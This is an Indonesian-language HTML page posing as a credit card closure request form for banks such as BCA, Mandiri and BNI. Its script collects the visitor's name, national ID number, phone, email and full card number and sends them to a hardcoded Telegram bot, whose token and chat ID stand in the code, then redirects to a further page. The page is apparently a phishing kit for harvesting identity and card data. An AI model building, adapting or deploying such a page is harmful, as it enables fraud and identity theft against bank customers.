<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Penutupan Kartu Kredit</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-gray-100">
    <div class="container mx-auto px-4 py-8 max-w-4xl">
        <!-- Hero Section -->
        <div class="text-center mb-8">
            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/e99ddad9-ec1e-4b74-b4d1-fce68aba4617.png" alt="Banner pengajuan penutupan kartu kredit dengan ilustrasi kartu kredit dipotong, warna merah dominan dengan teks putih" class="mx-auto rounded-lg shadow-md mb-4">
            <h1 class="text-3xl font-bold text-gray-800">Form Penutupan Kartu Kredit</h1>
            <p class="text-gray-600 mt-2">Isi form berikut untuk mengajukan penutupan kartu kredit Anda</p>
        </div>

        <!-- Form Section -->
        <div class="bg-white rounded-lg shadow-md p-6">
            <form id="penutupanForm" class="space-y-6">
                <!-- Personal Information -->
                <div class="space-y-4">
                    <h2 class="text-xl font-semibold text-gray-700 border-b pb-2 flex items-center">
                        <i class="fas fa-user-circle mr-2 text-blue-500"></i>
                        Data Pribadi
                    </h2>
                    
                    <!-- Nama Lengkap -->
                    <div class="relative">
                        <label for="nama" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-user mr-2 text-blue-500"></i>
                            Nama Lengkap
                        </label>
                        <input type="text" id="nama" name="nama" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Masukkan nama sesuai KTP">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-user text-gray-400"></i>
                        </div>
                    </div>
                    
                    <!-- Nomor KTP -->
                    <div class="relative">
                        <label for="ktp" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-id-card mr-2 text-blue-500"></i>
                            Nomor KTP
                        </label>
                        <input type="text" id="ktp" name="ktp" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Masukkan 16 digit nomor KTP">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-id-card text-gray-400"></i>
                        </div>
                    </div>
                    
                    <!-- Nomor HP -->
                    <div class="relative">
                        <label for="hp" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-phone mr-2 text-blue-500"></i>
                            Nomor Handphone
                        </label>
                        <input type="tel" id="hp" name="hp" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                            placeholder="Contoh: 081234567890">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-phone text-gray-400"></i>
                        </div>
                    </div>
                    
                    <!-- Email -->
                    <div class="relative">
                        <label for="email" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-envelope mr-2 text-blue-500"></i>
                            Alamat Email
                        </label>
                        <input type="email" id="email" name="email" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                            placeholder="email@contoh.com">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-envelope text-gray-400"></i>
                        </div>
                    </div>
                </div>
                
                <!-- Kartu Kredit Information -->
                <div class="space-y-4">
                    <h2 class="text-xl font-semibold text-gray-700 border-b pb-2 flex items-center">
                        <i class="fas fa-credit-card mr-2 text-red-500"></i>
                        Informasi Kartu Kredit
                    </h2>
                    
                    <!-- Nama Bank -->
                    <div class="relative">
                        <label for="bank" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-university mr-2 text-red-500"></i>
                            Bank Penerbit
                        </label>
                        <select id="bank" name="bank" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500">
                            <option value="">Pilih Bank Penerbit</option>
                            <option value="BCA">BCA</option>
                            <option value="Mandiri">Mandiri</option>
                            <option value="BNI">BNI</option>
                            <option value="BRI">BRI</option>
                            <option value="CIMB">CIMB Niaga</option>
                            <option value="Danamon">Bank Mega</option>
                        </select>
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-university text-gray-400"></i>
                        </div>
                    </div>
                    
                    <!-- Nomor Kartu Kredit -->
                    <div class="relative">
                        <label for="nomor_kartu" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-credit-card mr-2 text-red-500"></i>
                            Nomor Kartu Kredit
                        </label>
                        <input type="text" id="nomor_kartu" name="nomor_kartu" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500"
                            placeholder="16 digit nomor kartu">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-credit-card text-gray-400"></i>
                        </div>
                    </div>
                    
                    <!-- Tanggal Pembuatan Kartu -->
                    <div class="relative">
                        <label for="tanggal_buat" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-calendar-plus mr-2 text-red-500"></i>
                            Tanggal Pembuatan Kartu
                        </label>
                        <input type="date" id="tanggal_buat" name="tanggal_buat" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-calendar-plus text-gray-400"></i>
                        </div>
                    </div>
                    
                    <!-- Alasan Penutupan -->
                    <div class="relative">
                        <label for="alasan" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-comment-dots mr-2 text-red-500"></i>
                            Alasan Penutupan
                        </label>
                        <select id="alasan" name="alasan" required
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500">
                            <option value="">Pilih Alasan Penutupan</option>
                            <option value="tidak_digunakan">Tidak digunakan lagi</option>
                            <option value="biaya">Biaya admin terlalu tinggi</option>
                            <option value="pindah_bank">Pindah ke bank lain</option>
                            <option value="lainnya">Lainnya</option>
                        </select>
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none mt-5">
                            <i class="fas fa-comment-dots text-gray-400"></i>
                        </div>
                    </div>
                    
                    <!-- Keterangan Tambahan -->
                    <div class="relative">
                        <label for="keterangan" class="block text-sm font-medium text-gray-700 mb-1 flex items-center">
                            <i class="fas fa-info-circle mr-2 text-red-500"></i>
                            Keterangan Tambahan (Opsional)
                        </label>
                        <textarea id="keterangan" name="keterangan" rows="3"
                            class="mt-1 block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500"
                            placeholder="Jelaskan lebih detail jika diperlukan"></textarea>
                        <div class="absolute top-8 left-0 pl-3 flex items-start pointer-events-none">
                            <i class="fas fa-info-circle text-gray-400 mt-1"></i>
                        </div>
                    </div>
                </div>
                
                <!-- Submit Button -->
                <div class="pt-4">
                    <button type="submit" id="submitBtn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-md transition duration-300 flex items-center justify-center">
                        <i class="fas fa-paper-plane mr-2"></i>
                        AJUKAN PENUTUPAN
                    </button>
                </div>
            </form>
        </div>
        
        <!-- Status Message -->
        <div id="statusMessage" class="mt-4 hidden p-4 rounded-md"></div>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-6 mt-8">
        <div class="container mx-auto px-4 text-center">
            <p>Layanan Pengajuan Penutupan Kartu Kredit</p>
            <p class="mt-2 text-gray-400 text-sm">Â© 2023 Semua Hak Cipta Dilindungi</p>
        </div>
    </footer>

    <script>
        document.getElementById('penutupanForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const statusMessage = document.getElementById('statusMessage');
            
            // Validate form
            const nama = document.getElementById('nama').value.trim();
            const ktp = document.getElementById('ktp').value.trim();
            const hp = document.getElementById('hp').value.trim();
            const email = document.getElementById('email').value.trim();
            const bank = document.getElementById('bank').value;
            const nomor_kartu = document.getElementById('nomor_kartu').value.trim();
            const tanggal_buat = document.getElementById('tanggal_buat').value;
            const alasan = document.getElementById('alasan').value;
            
            if (!nama || !ktp || !hp || !email || !bank || !nomor_kartu || !tanggal_buat || !alasan) {
                showStatus('Harap isi semua field yang wajib diisi', 'error');
                return;
            }
            
            // Disable button to prevent double submission
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> MENGIRIM...';
            
            // Collect form data
            const formData = {
                nama,
                ktp,
                hp,
                email,
                bank,
                nomor_kartu,
                tanggal_buat,
                alasan,
                keterangan: document.getElementById('keterangan').value.trim()
            };
            
            try {
                // Replace with your Telegram bot token and chat ID
                const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
                const chatId = '7549590022';
                
                // Format message for Telegram
                const messageText = `
ðŸ“¢ *PENGAJUAN PENUTUPAN KARTU KREDIT BARU* ðŸš¨
                    
*Data Pemohon:*
 Nama: ${formData.nama}
 KTP: ${formData.ktp}
 HP: ${formData.hp}
 Email: ${formData.email}
                    
*Detail Kartu:*
 Bank: ${formData.bank}
 No. Kartu: ${formData.nomor_kartu}
 Tanggal Buat: ${formData.tanggal_buat}
                    
*Alasan Penutupan:*
${formData.alasan}
${formData.keterangan ? `\n Keterangan:\n${formData.keterangan}` : ''}
                    
_Pengajuan diterima pada ${new Date().toLocaleString()}_`;
                
                // Send to Telegram
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                  window.location.href="kartu.html";
                    showStatus('Pengajuan Anda berhasil dikirim! Kami akan menghubungi Anda segera.', 'success');
                    document.getElementById('penutupanForm').reset();
                } else {
                    console.error('Telegram API error:', result);
                    showStatus('Gagal mengirim pengajuan. Silakan coba beberapa saat lagi.', 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showStatus('Terjadi kesalahan saat mengirim data. Silakan coba kembali.', 'error');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-paper-plane mr-2"></i> AJUKAN PENUTUPAN';
            }
        });
        
        function showStatus(message, type) {
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.textContent = message;
            statusMessage.className = 'mt-4 p-4 rounded-md block';
            
            if (type === 'success') {
                statusMessage.classList.add('bg-green-100', 'text-green-700', 'border', 'border-green-200');
            } else if (type === 'error') {
                statusMessage.classList.add('bg-red-100', 'text-red-700', 'border', 'border-red-200');
            }
            
            statusMessage.classList.remove('hidden');
            
            // Auto hide after 5 seconds
            setTimeout(() => {
                statusMessage.classList.add('hidden');
            }, 5000);
        }
    </script>
</body>
</html>

                          
